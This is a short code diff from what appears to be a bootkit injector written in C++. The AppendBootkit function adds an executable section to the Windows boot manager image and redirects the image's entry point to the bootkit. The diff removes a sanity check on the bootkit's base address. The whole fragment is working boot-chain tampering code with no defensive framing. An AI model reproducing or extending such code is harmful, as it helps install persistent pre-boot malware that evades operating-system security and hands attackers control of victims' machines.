@@ -104,15 +104,8 @@ static bool AppendBootkit(std::vector<uint8_t>& BootmgfwData, std::vector<uint8_
     NewSection.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
     NewSection.VirtualAddress = Sections[NumberOfSections - 1].VirtualAddress + AlignSize(Sections[NumberOfSections - 1].Misc.VirtualSize, BootmgfwHeaders->OptionalHeader.SectionAlignment);
 
-    // Check the static base is correct
-    auto BootkitBase = NewSection.VirtualAddress + AlignmentSize;
-    if (BootkitBase != BootkitHeaders->OptionalHeader.ImageBase)
-    {
-        printf("[Injector] Invalid bootkit base (0x%llx), expected /BASE:0x%x\n", BootkitHeaders->OptionalHeader.ImageBase, BootkitBase);
-        return false;
-    }
-
     // Adjust the headers
+    auto BootkitBase = NewSection.VirtualAddress + AlignmentSize;
     BootmgfwHeaders->OptionalHeader.AddressOfEntryPoint = BootkitBase + BootkitEntryPoint;
     BootmgfwHeaders->OptionalHeader.SizeOfImage += NewSection.Misc.VirtualSize;
     BootmgfwHeaders->FileHeader.NumberOfSections++;
